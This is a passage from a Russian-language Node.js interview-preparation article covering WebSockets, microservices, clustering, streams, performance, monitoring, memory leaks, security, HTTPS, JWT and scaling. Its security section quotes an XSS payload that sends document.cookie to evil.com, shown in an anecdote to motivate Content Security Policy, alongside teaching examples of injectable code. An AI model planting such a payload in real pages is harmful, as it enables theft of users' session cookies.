Предлагать изменения в проекты, к которым у вас нет прямого доступа на запись.
Использовать чужой проект как отправную точку для собственных идей.
Проверять как определенные изменения повлияют на проект перед внесением их в основную ветку.

Процесс обычно выглядит так:
1. Создать форк репозитория (через интерфейс GitHub/GitLab).
2. Клонировать форк локально.
3. Внести изменения и отправить их в свой форк.
4. Создать Pull Request (PR) в оригинальный репозиторий.
Хотя этот вопрос больше связан с Git, чем с Node.js напрямую, он часто возникает в контексте работы над Node.js проектами и модулями.
В моей практике, кстати, тщательная проверка вклада кандидата в open-source проекты часто даёт больше информации о его реальных навыках, чем десяток вопросов на алгоритмы. Умение грамотно создавать PRы, писать тесты и документацию — признаки действительно зрелого разработчика.

29. Как работают веб-сокеты в Node.js?

Ответ: WebSockets — это протокол, обеспечивающий полнодуплексную связь (двунаправленную одновременную) между клиентом и сервером по одному долгоживущему соединению. В отличие от HTTP, где клиент всегда инициирует запрос, WebSockets позволяют серверу отправлять данные клиенту без дополнительных запросов.
В Node.js для работы с WebSockets чаще всего используется библиотека Socket.IO или ws:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
// Сервер с Socket.IO
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
 
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
 
io.on('connection', (socket) => {
  console.log('Новое соединение');
  
  // Обработка событий от клиента
  socket.on('message', (data) => {
    console.log('Получено сообщение:', data);
    
    // Отправка ответа
    socket.emit('response', { status: 'ok', message: 'Получено!' });
    
    // Отправка всем клиентам кроме отправителя
    socket.broadcast.emit('broadcast', { message: 'Новое сообщение!' });
    
    // Отправка всем клиентам включая отправителя
    io.emit('globalEvent', { message: 'Всем привет!' });
  });
  
  socket.on('disconnect', () => {
    console.log('Соединение закрыто');
  });
});
 
server.listen(3000, () => {
  console.log('Сервер запущен на порту 3000');
});
WebSockets идеальны для приложений реального времени: чатов, игр, торговых платформ, дашбордов с живой аналитикой. Их главное преимущество — низкая латентность и уменьшение нагрузки за счёт отсутствия постоянного создания новых HTTP-соединений. Однажды мы смогли сократить нагрузку на сервер в 30 раз, заменив периодические HTTP-запросы на WebSocket-соединение в приложении мониторинга. Правда, пришлось потратить неделю на отладку edge-case с прокси-серверами, которые обрывали неактивные соединения.

30. Объясните концепцию микросервисной архитектуры в Node.js

Ответ: Микросервисная архитектура — подход к разработке, при котором приложение строится как набор небольших, слабо связанных сервисов, каждый из которых отвечает за конкретную бизнес-функцию и может быть разработан, развёрнут и масштабирован независимо. Node.js идеально подходит для микросервисов благодаря своей лёгкости, эффективности работы с I/O и богатой экосистеме инструментов для построения API. Основные принципы микросервисной архитектуры:
Независимость сервисов — каждый микросервис может быть разработан, обновлён и масштабирован отдельно,
Децентрализация данных — каждый сервис имеет собственное хранилище данных,
Общение через API — взаимодействие сервисов происходит через сетевые протоколы,
Отказоустойчивость — сбой в одном сервисе не вызывает каскадного отказа всей системы.
Вот пример примитивного микросервиса на Node.js:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
// user-service.js - Микросервис управления пользователями
const express = require('express');
const app = express();
app.use(express.json());
 
const users = []; // В реальном проекте здесь была бы БД
 
app.post('/users', (req, res) => {
  const user = {
    id: Date.now().toString(),
    name: req.body.name,
    email: req.body.email
  };
  users.push(user);
  res.status(201).json(user);
});
 
app.get('/users/:id', (req, res) => {
  const user = users.find(u => u.id === req.params.id);
  if (!user) return res.status(404).send('Пользователь не найден');
  res.json(user);
});
 
app.listen(3001, () => console.log('Сервис пользователей запущен на порту 3001'));
Для коммуникации между микросервисами можно использовать REST API, GraphQL, gRPC или систему обмена сообщениями вроде RabbitMQ или Kafka. Существуют специальные фреймворки для микросервисов в Node.js, например, Moleculer, Seneca, и NestJS — они упрощают создание и управление микросервисами.
На прошлом проекте наша команда мигрировала с монолита на микросервисы, и самым сложным оказалось не создание самих сервисов, а настройка эффективной мониторинг-системы. Без трассировки запросов через множество сервисов отладка превратилась в настоящий кошмар. Так что не забывайте про наблюдаемость (observability) в микросервисной архитектуре!

31. Как работает кластеризация в Node.js?

Ответ: Кластеризация в Node.js позволяет использовать все ядра процессора путём создания дочерних процессов (воркеров), которые разделяют один и тот же серверный порт. Это решает проблему однопоточности Node.js и позволяет эффективно масштабировать приложения вертикально. Модуль cluster встроен в Node.js и позволяет легко создавать процессы-воркеры:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;
 
if (cluster.isMaster) {
  // Код основного процесса
  console.log(`Мастер-процесс ${process.pid} запущен`);
 
  // Создаём воркеры для каждого ядра CPU
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
 
  // Обработка завершения воркера
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Воркер ${worker.process.pid} завершился с кодом ${code}`);
    console.log('Создаём нового воркера...');
    cluster.fork(); // Автоматически заменяем упавший воркер
  });
} else {
  // Код процесса-воркера
  http.createServer((req, res) => {
    res.writeHead(200);
    res.end(`Привет от процесса ${process.pid}`);
  }).listen(8000);
 
  console.log(`Воркер ${process.pid} запущен`);
}
При таком подходе мастер-процесс отвечает за создание и мониторинг воркеров, а воркеры обрабатывают входящие запросы. Механизм балансировки нагрузки встроен в модуль cluster и распределяет запросы между воркерами по принципу round-robin (на более новых версиях Node.js). Кластеризация может дать значительный прирост производительности. На одном проекте после внедрения кластеризации на четырёхъядерном сервере мы получили почти четырёхкратное увеличение пропускной способности API с минимальными изменениями в коде. Впрочем, не забывайте, что кластеризация помогает только при CPU-интенсивных операциях — если ваше приложение в основном ожидает I/O, выигрыш может быть незначительным.

32. Что такое стримы (Streams) в Node.js и какие типы стримов существуют?

Ответ: Стримы (Streams) — это одна из фундаментальных концепций Node.js, которая позволяет обрабатывать данные по частям, а не загружать всё в память сразу. Это особенно важно при работе с большими объёмами данных, такими как видео, большие файлы или сетевой трафик. В Node.js существует четыре основных типа стримов:

1. Readable — стримы для чтения данных:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
const fs = require('fs');
const readableStream = fs.createReadStream('bigfile.txt', { encoding: 'utf8', highWaterMark: 16 * 1024 });
 
readableStream.on('data', (chunk) => {
  console.log(`Получен чанк данных: ${chunk.length} байт`);
});
 
readableStream.on('end', () => {
  console.log('Чтение завершено');
});
2. Writable — стримы для записи данных:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
const fs = require('fs');
const writableStream = fs.createWriteStream('output.txt');
 
writableStream.write('Привет, ');
writableStream.write('мир!');
writableStream.end('\nКонец файла');
 
writableStream.on('finish', () => {
  console.log('Запись завершена');
});
3. Duplex — стримы, которые могут и читать, и записывать (например, сокеты):
JavaScriptСкопировано
1
2
3
4
5
6
7
8
const net = require('net');
const server = net.createServer((socket) => {
  // socket - это duplex stream
  socket.write('Привет клиент!');
  socket.on('data', (data) => {
    console.log(`Получено от клиента: ${data}`);
  });
});
4. Transform — особый тип duplex-стримов, которые изменяют данные при чтении или записи:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
const { Transform } = require('stream');
const zlib = require('zlib');
 
// zlib.createGzip() - это transform stream для сжатия данных
const inputFile = fs.createReadStream('input.txt');
const outputFile = fs.createWriteStream('input.txt.gz');
const gzip = zlib.createGzip();
 
inputFile.pipe(gzip).pipe(outputFile);
Стримы можно соединять через pipe(), создавая конвейеры обработки данных. Это похоже на конвейеры в Unix-подобных операционных системах.
Один из моих любимых паттернов — использование transform-стримов для парсинга и обработки больших объёмов данных:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
const { Transform } = require('stream');
 
// Кастомный transform stream для фильтрации JSON-объектов
class FilterStream extends Transform {
  constructor(filterFn) {
    super({ objectMode: true });
    this.filterFn = filterFn;
  }
 
  _transform(chunk, encoding, callback) {
    if (this.filterFn(chunk)) {
      this.push(chunk);
    }
    callback();
  }
}
 
// Использование в конвейере обработки
fs.createReadStream('huge-data.json')
  .pipe(new JsonParseStream())  // Превращает строки в объекты
  .pipe(new FilterStream(obj => obj.score > 90))  // Фильтрует объекты
  .pipe(new JsonStringifyStream())  // Превращает объекты обратно в строки
  .pipe(fs.createWriteStream('filtered-data.json'));
Такой подход позволил мне обработать 50-гигабайтный JSON-файл на машине с 8 ГБ памяти, при этом пиковое потребление памяти не превышало 200 МБ. Магия стримов!

Вопросы о производительности и безопасности

Переходим к, пожалуй, самым мясистым темам — производительность и безопасность. Именно здесь можно увидеть разницу между просто хорошим и действительно опытным Node.js разработчиком. Эти вопросы обычно задают на финальных этапах собеседования, когда пытаются понять, насколько глубоко вы понимаете платформу.

33. Как оптимизировать производительность Node.js приложения?

Ответ: Оптимизация Node.js приложений — это целое искусство, включающее несколько ключевых стратегий:

1. Профилирование и поиск узких мест:
JavaScriptСкопировано
1
2
3
4
5
6
7
// Простое профилирование с console.time
console.time('операция');
// ... код для профилирования
console.timeEnd('операция');
 
// Использование встроенного профайлера Node.js
node --prof app.js
2. Использование кластеризации для задействования всех ядер CPU:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
 
if (cluster.isMaster) {
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
} else {
  // Код вашего сервера
}
3. Кэширование часто запрашиваемых данных (в памяти, Redis, Memcached):
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
const nodeCache = require('node-cache');
const cache = new nodeCache({ stdTTL: 100 });
 
function getData(key, cb) {
  const cachedValue = cache.get(key);
  if (cachedValue) {
    return cb(null, cachedValue);
  }
  
  // Данных в кэше нет, получаем их из БД
  db.query('SELECT * FROM data WHERE id = ?', [key], (err, results) => {
    if (err) return cb(err);
    
    // Сохраняем в кэш и возвращаем
    cache.set(key, results);
    cb(null, results);
  });
}
4. Асинхронность и неблокирующие операции — основы Node.js:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
// Плохо: блокируем Event Loop
const users = db.query('SELECT * FROM users').toArray();
processUsers(users);
 
// Хорошо: используем колбэки или async/await
db.query('SELECT * FROM users', (err, users) => {
  if (err) return handleError(err);
  processUsers(users);
});
5. Оптимизация управления памятью — избегание утечек памяти и правильное использование буферов и стримов.
Помню, как в одном проекте мы столкнулись с тормозами при загрузке большого JSON файла (около 300 МБ). Решение? Отказаться от JSON.parse(fs.readFileSync()) в пользу потоковой обработки с JSONStream:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
const fs = require('fs');
const JSONStream = require('JSONStream');
 
fs.createReadStream('huge-data.json')
  .pipe(JSONStream.parse('*.items'))
  .on('data', item => {
    // Обработка каждого элемента по отдельности
    processItem(item);
  });
Использование стримов вместо загрузки всего файла сократило потребление памяти с 1.2 ГБ до менее 100 МБ. Магия, да и только!

34. Какие инструменты можно использовать для мониторинга Node.js приложений?

Ответ: Мониторинг — это глаза и уши ваших приложений в продакшене. Основные инструменты:

pm2 — менеджер процессов с базовыми функциями мониторинга:
BashСкопировано
1
2
3
npm install pm2 -g
pm2 start app.js --name="my-app" -i max  # Запуск в кластерном режиме на всех ядрах
pm2 monit  # Просмотр статистики в реальном времени
New Relic и Datadog — комерческие решения для глубокого мониторинга и анализа производительности.

Elastic APM — опен-сорс альтернатива для трассировки и мониторинга:
JavaScriptСкопировано
1
2
3
4
5
const apm = require('elastic-apm-node').start({
  serviceName: 'my-service',
  secretToken: 'token',
  serverUrl: 'http://localhost:8200'
});
Prometheus + Grafana — мощное опенсорсное решение для метрик и визуализации:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
const express = require('express');
const app = express();
const prom = require('prom-client');
 
// Создаём счётчик для HTTP запросов
const httpRequestsTotal = new prom.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'route', 'status']
});
 
// Middleware для подсчёта запросов
app.use((req, res, next) => {
  res.on('finish', () => {
    httpRequestsTotal.inc({
      method: req.method,
      route: req.route ? req.route.path : req.path,
      status: res.statusCode
    });
  });
  next();
});
 
// Эндпоинт для Prometheus
app.get('/metrics', (req, res) => {
  res.set('Content-Type', prom.register.contentType);
  res.end(prom.register.metrics());
});
Один хак, который я использую: настраиваю алерты не только на очевидные вещи (CPU, память), но и на бизнес-метрики. Например, если количество успешных платежей падает ниже определённого порога в минуту — это может сигнализировать о проблеме до того, как пользователи начнут жаловаться.

35. Как обнаружить и устранить утечки памяти в Node.js?

Ответ: Утечки памяти случаются даже в сборщиках мусора, а в Node.js они чаще всего связаны с замыканиями, таймерами и event listeners. Процесс обнаружения:

1. Использование инструментов для получения heap snapshot:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
// Встроенный модуль для дампа памяти
const heapdump = require('heapdump');
 
// Сделать дамп памяти по запросу
app.get('/heapdump', (req, res) => {
  const filename = `/tmp/heapdump-${Date.now()}.heapsnapshot`;
  heapdump.writeSnapshot(filename, (err) => {
    if (err) return res.status(500).send(err.message);
    res.send(`Heapdump written to ${filename}`);
  });
});
2. Анализ в Chrome DevTools: загрузите полученный дамп в Chrome DevTools -> Memory -> Load

3. Отслеживание использования памяти в коде:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
const memwatch = require('memwatch-next');
 
// Отслеживание скачков использования памяти
memwatch.on('leak', (info) => {
  console.log('Возможная утечка памяти:', info);
});
 
// Разница между сборками мусора
memwatch.on('stats', (stats) => {
  console.log('Статистика GC:', stats);
});
Частые причины утечек:
Незакрытые слушатели событий: всегда используйте removeListener или removeAllListeners,
Таймеры, которые не очищаются: используйте clearInterval и clearTimeout,
Циклические ссылки: особенно в замыканиях,
Кэширование без лимитов: всегда устанавливайте maxSize для кеша.
Недавно мы мучались с утечкой памяти в продакшене, и оказалось, что причина в кэшировании шаблонов в Express без ограничения размера кэша. Каждый уникальный URL генерировал новую запись в кэше, и через несколько дней память просто взрывалась. Решением стало:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
app.set('view cache', false);  // Отключить дефолтный кэш
const LRU = require('lru-cache');
const viewCache = new LRU({ max: 100 });  // Кэш с ограничением
 
app.use((req, res, next) => {
  const render = res.render;
  res.render = function(view, options, callback) {
    const cacheKey = `${view}-${JSON.stringify(options)}`;
    const cachedHTML = viewCache.get(cacheKey);
    
    if (cachedHTML) {
      return res.send(cachedHTML);
    }
    
    render.call(this, view, options, (err, html) => {
      if (!err) {
        viewCache.set(cacheKey, html);
      }
      if (typeof callback === 'function') {
        callback(err, html);
      } else {
        res.send(html);
      }
    });
  };
  next();
});
36. Какие основные уязвимости безопасности существуют в Node.js приложениях?

Ответ: Безопасность — тема, которую нелзя игнорировать. Основные уязвимости:

1. Инъекции (SQL, NoSQL, Command):
JavaScriptСкопировано
1
2
3
4
5
// Уязвимый код
db.query(`SELECT * FROM users WHERE username = '${username}'`);  // SQL инъекция
 
// Безопасный код
db.query('SELECT * FROM users WHERE username = ?', [username]);
2. Cross-Site Scripting (XSS) — всегда экранируйте вывод:
JavaScriptСкопировано
1
2
3
4
5
6
// Уязвимый код
res.send(`Привет, ${username}!`);  // Если username содержит HTML/JS
 
// Безопасный код с Express
const escapeHtml = require('escape-html');
res.send(`Привет, ${escapeHtml(username)}!`);
3. Небезопасная десериализация:
JavaScriptСкопировано
1
2
3
4
5
// Уязвимый код
const obj = JSON.parse(data);  // OK для JSON
const obj = eval('(' + data + ')');  // Крайне небезопасно!
 
// Для других форматов используйте проверенные библиотеки
4. Отсутствие проверки зависимостей — регулярно аудитируйте пакеты:
BashСкопировано
1
2
npm audit
npm audit fix
5. Exposure of Sensitive Information — не хардкодьте пароли/токены:
JavaScriptСкопировано
1
2
3
4
5
// Плохо
const password = 'SuperSecret123';
 
// Хорошо
const password = process.env.DB_PASSWORD;
6. Broken Authentication — используйте proven libraries:
JavaScriptСкопировано
1
2
3
4
5
6
// Хеширование пароля
const bcrypt = require('bcrypt');
const hashedPassword = await bcrypt.hash(password, 10);
 
// Сравнение
const match = await bcrypt.compare(password, hashedPassword);
7. Неправильные настройки CORS:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
// Слишком разрешительные настройки
app.use(cors());  // Разрешает все домены
 
// Более безопасно
app.use(cors({
  origin: ['https://trusted-site.com'],
  methods: ['GET', 'POST'],
  credentials: true
}));
Помню, как мы однажды словили XSS-уязвимость в продакшене, просто забыв отсанитизировать текст комментариев перед выводом. Один "умный" пользователь вставил <script>document.location='https://evil.com?cookie='+document.cookie</script>, и понеслась... С тех пор мы используем CSP (Content Security Policy) для всех проектов:

JavaScriptСкопировано
1
2
3
4
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  next();
});
37. Как обеспечить безопасную обработку пользовательского ввода в Node.js?

Ответ: Безопасная обработка пользовательского ввода — фундаментальный принцип веб-безопасности. В Node.js это включает:

1. Валидация и санитизация на сервере (никогда не доверяйте фронтенду):
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
const { body, validationResult } = require('express-validator');
 
app.post('/user',
  // Валидация
  body('email').isEmail().normalizeEmail(),
  body('password').isLength({ min: 8 }),
  body('name').trim().escape(),  // Санитизация от HTML/JS-инъекций
  
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // Безопасно использовать данные
    createUser(req.body);
  }
);
2. Использование parameterized queries для баз данных:
JavaScriptСкопировано
1
2
3
4
5
// MongoDB (с Mongoose)
User.findOne({ username: username })  // Параметры автоматически эскейпятся
 
// Vanilla SQL
connection.query('SELECT * FROM users WHERE id = ?', [userId]);
3. Ограничение размера запросов для предотвращения DoS-атак:
JavaScriptСкопировано
1
2
3
const bodyParser = require('body-parser');
app.use(bodyParser.json({ limit: '1mb' }));
app.use(bodyParser.urlencoded({ limit: '1mb', extended: true }));
4. Проверка загружаемых файлов — типы, размеры, содержимое:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
const multer = require('multer');
const upload = multer({
  limits: { fileSize: 5 * 1024 * 1024 },  // 5MB
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png'];
    if (!allowedTypes.includes(file.mimetype)) {
      return cb(new Error('Invalid file type'));
    }
    cb(null, true);
  }
});
 
app.post('/upload', upload.single('avatar'), (req, res) => {
  // Файл прошел все проверки
});
Мой любимый пример из практики — сайт, где пользователи могли загружать аватары. Всё работало хорошо, пока кто-то не загрузил файл с расширением .jpg, который на самом деле был исполняемым PHP-скриптом. К счастью, у нас была проверка MIME-типа на основе содержимого файла, а не только расширения.

38. Как внедрить HTTPS в Node.js приложение?

Ответ: HTTPS — обязательный стандарт для современных веб-приложений. Внедрить его в Node.js довольно просто:

1. Получите SSL-сертификат — коммерческий или бесплатный (Let's Encrypt)

2. Создайте HTTPS-сервер:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
const https = require('https');
const fs = require('fs');
const express = require('express');
 
const app = express();
 
// Ваши маршруты и middleware
app.get('/', (req, res) => {
  res.send('Привет из защищённого сервера!');
});
 
// Настройка SSL
const options = {
  key: fs.readFileSync('/path/to/privkey.pem'),
  cert: fs.readFileSync('/path/to/cert.pem'),
  ca: fs.readFileSync('/path/to/chain.pem')  // Если есть цепочка сертификатов
};
 
// Создание HTTPS-сервера
https.createServer(options, app).listen(443, () => {
  console.log('HTTPS сервер запущен на порту 443');
});
3. Перенаправление с HTTP на HTTPS:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
const http = require('http');
const express = require('express');
 
const httpApp = express();
 
// Перенаправление всех HTTP запросов на HTTPS
httpApp.all('*', (req, res) => {
  res.redirect(301, [INLINE]https://${req.hostname}${req.url}[/INLINE]);
});
 
http.createServer(httpApp).listen(80);
4. Настройка HSTS для дополнительной безопасности:
JavaScriptСкопировано
1
2
3
4
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  next();
});
Забавная (хотя на тот момент не очень) история: на одном проекте мы настроили HTTPS, но забыли обновить URL в одном из микросервисов. В итоге часть API была недоступна, и мы потратили пару часов на отладку, пока не заметили, что вызовы идут на HTTP вместо HTTPS. Мораль: всегда используйте корректные URL во всех интеграциях!

39. Как реализовать аутентификацию с помощью JWT в Node.js?

Ответ: JWT (JSON Web Token) — популярный механизм аутентификации для современных веб-приложений и API. JWT представляет собой закодированный JSON-объект, подписанный секретным ключом, что гарантирует его целостность.
Реализация JWT в Node.js обычно включает следующие шаги:

1. Установка зависимостей:
BashСкопировано
1
npm install jsonwebtoken bcrypt
2. Создание токена при аутентификации:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
 
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Поиск пользователя в БД
  const user = await User.findOne({ username });
  if (!user) {
    return res.status(401).json({ message: 'Пользователь не найден' });
  }
  
  // Проверка пароля
  const validPassword = await bcrypt.compare(password, user.password);
  if (!validPassword) {
    return res.status(401).json({ message: 'Неверный пароль' });
  }
  
  // Создание JWT токена
  const token = jwt.sign(
    { id: user._id, username: user.username, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }  // Токен действителен 1 час
  );
  
  res.json({ token });
});
3. Создание middleware для защиты маршрутов:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];  // Bearer TOKEN
  
  if (!token) {
    return res.status(401).json({ message: 'Нет токена авторизации' });
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ message: 'Недействительный токен' });
    }
    
    req.user = user;  // Добавляем данные пользователя в объект запроса
    next();
  });
}
 
// Защита маршрута
app.get('/protected', authenticateToken, (req, res) => {
  res.json({ message: `Привет, ${req.user.username}!` });
});
4. Реализация middleware для проверки ролей:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
function authorizeRole(role) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ message: 'Нет доступа' });
    }
    next();
  };
}
 
// Маршрут только для администраторов
app.get('/admin', authenticateToken, authorizeRole('admin'), (req, res) => {
  res.json({ message: 'Панель администратора' });
});
На одном из проектов мы столкнулись с интересной проблемой — JWT токены иногда не работали при переходах между разделами сайта. Оказалось, часы на одном из серверов в кластере отставали на несколько минут, и токены считались либо истекшими, либо еще не валидными. Мораль истории: всегда настраивайте NTP на серверах!

40. Каковы основные способы масштабирования Node.js приложений?

Ответ: Масштабирование — это искуство заставить ваше приложение обрабатывать больше запросов без ущерба для производительности. Существует несколько основных подходов:
1. Вертикальное масштабирование — увеличение мощности отдельного сервера:
- Использование кластерного модуля (cluster) для задействования всех CPU.
- Оптимизация кода и управления памятью.
- Увеличение ресурсов сервера (CPU, RAM).
2. Горизонтальное масштабирование — увеличение количества серверов:
- Балансировка нагрузки между несколькими инстансами приложения.
- Stateless архитектура (состояние хранится вне приложения).
- Распределенное кэширование (Redis, Memcached).
3. Микросервисная архитектура — разделение монолита на отдельные сервисы:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
// Сервис пользователей
const express = require('express');
const app = express();
 
app.get('/api/users/:id', async (req, res) => {
  // Логика получения пользователя
});
 
app.listen(3001);
 
// Сервис продуктов (отдельное приложение)
const express = require('express');
const app = express();
 
app.get('/api/products/:id', async (req, res) => {
  // Логика получения продукта
});
 
app.listen(3002);
4. Асинхронная обработка с очередями сообщений:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
// Отправка задачи в очередь
const amqp = require('amqplib');
 
async function publishToQueue(task) {
  const connection = await amqp.connect('amqp://localhost');
  const channel = await connection.createChannel();
  
  await channel.assertQueue('tasks_queue');
  channel.sendToQueue('tasks_queue', Buffer.from(JSON.stringify(task)));
  
  console.log("Задача отправлена в очередь");
  
  setTimeout(() => {
    connection.close();
  }, 500);
}
 
// Обработчик задач (отдельный процесс)
async function processQueue() {
  const connection = await amqp.connect('amqp://localhost');
  const channel = await connection.createChannel();
  
  await channel.assertQueue('tasks_queue');
  
  console.log("Ожидание задач...");
  
  channel.consume('tasks_queue', (msg) => {
    const task = JSON.parse(msg.content.toString());
    
    // Длительная обработка задачи
    processTask(task);
    
    channel.ack(msg);
  });
}
5. Оптимизация баз данных:
- Шардинг,
- Репликация,
- Индексация,
- Денормализация данных для часто запрашиваемой информации.

Я как-то работал с проектом, где мы начали с монолита на одном сервере. Когда нагрузка выросла, мы попробовали просто добавить больше серверов... и все развалилось. Почему? Потому что сессии хранились в памяти процесса, и пользователи перенаправлялись на разные серверы! Решением стало вынесение сессий в Redis:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');
 
// Создание клиента Redis
const redisClient = createClient({ url: 'redis://localhost:6379' });
redisClient.connect().catch(console.error);
 
// Настройка хранилища сессий
const redisStore = new RedisStore({
  client: redisClient,
  prefix: "myapp:"
});
 
app.use(session({
  store: redisStore,
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false
}));
После этого мы смогли масштабировать до десятка серверов без проблем с сессиями пользователей.

41. Как работать с WebSocket в Node.js для создания приложений реального времени?

Ответ: WebSocket — протокол, который обеспечивает полнодуплексный канал связи через одно TCP-соединение, идеальный для приложений реального времени. В Node.js чаще всего используются библиотеки Socket.IO и ws.
Пример с Socket.IO:

1. Настройка сервера:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
 
const app = express();
const server = http.createServer(app);
const io = new Server(server);
 
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});
 
// Обработка соединений
io.on('connection', (socket) => {
  console.log('Пользователь подключился');
  
  // Отправка сообщения конкретному клиенту
  socket.emit('welcome', { message: 'Добро пожаловать!' });
  
  // Отправка всем кроме отправителя
  socket.on('chat message', (msg) => {
    socket.broadcast.emit('chat message', msg);
  });
  
  // Отправка всем включая отправителя
  socket.on('global event', (data) => {
    io.emit('global event', data);
  });
  
  // Комнаты (каналы)
  socket.on('join room', (room) => {
    socket.join(room);
    io.to(room).emit('room message', [INLINE]Новый пользователь в комнате ${room}[/INLINE]);
  });
  
  socket.on('disconnect', () => {
    console.log('Пользователь отключился');
  });
});
 
server.listen(3000, () => {
  console.log('Сервер запущен на порту 3000');
});
2. Клиентский код (front-end):
HTML5Скопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
<!DOCTYPE html>
<html>
<head>
  <title>Socket.IO чат</title>
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    
    // Получение сообщений
    socket.on('welcome', (data) => {
      console.log(data.message);
    });
    
    socket.on('chat message', (msg) => {
      const messages = document.getElementById('messages');
      const li = document.createElement('li');
      li.textContent = msg;
      messages.appendChild(li);
    });
    
    // Отправка сообщений
    function sendMessage() {
      const input = document.getElementById('m');
      socket.emit('chat message', input.value);
      input.value = '';
      return false;
    }
    
    // Присоединение к комнате
    function joinRoom(room) {
      socket.emit('join room', room);
    }
  </script>
</head>
<body>
  <ul id="messages"></ul>
  <form onsubmit="return sendMessage();">
    <input id="m" autocomplete="off" /><button>Отправить</button>
  </form>
  <button onclick="joinRoom('general')">Общая комната</button>
  <button onclick="joinRoom('dev')">Комната разработчиков</button>
</body>
</html>
3. Масштабирование WebSocket приложений с Redis:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');
const { createAdapter } = require('@socket.io/redis-adapter');
const { createClient } = require('redis');
 
const app = express();
const server = createServer(app);
const io = new Server(server);
 
// Настройка Redis-адаптера
const pubClient = createClient({ url: 'redis://localhost:6379' });
const subClient = pubClient.duplicate();
 
Promise.all([pubClient.connect(), subClient.connect()]).then(() => {
  io.adapter(createAdapter(pubClient, subClient));
  
  io.on('connection', (socket) => {
    // Теперь сообщения будут работать между разными инстансами
    // приложения, подключенными к одному Redis
  });
  
  server.listen(3000);
});
WebSocket может существенно улучшить опыт пользователя. В одном из проектов мы заменили вечный пулинг API каждые 3 секунды на WebSocket-соединение и снизили нагрузку на сервер на 70% при одновременном ускорении доставки обновлений с 3 секунд до ~50 милисекунд. Пользователи были в восторге от "моментальных" обновлений на странице!

42. Как обеспечить отказоустойчивость Node.js приложений?

Ответ: Отказоустойчивость — способность системы продолжать работу при сбоях. Для Node.js приложений это включает:

1. Перехват и обработка необработанных исключений:
JavaScriptСкопировано
1
2
3
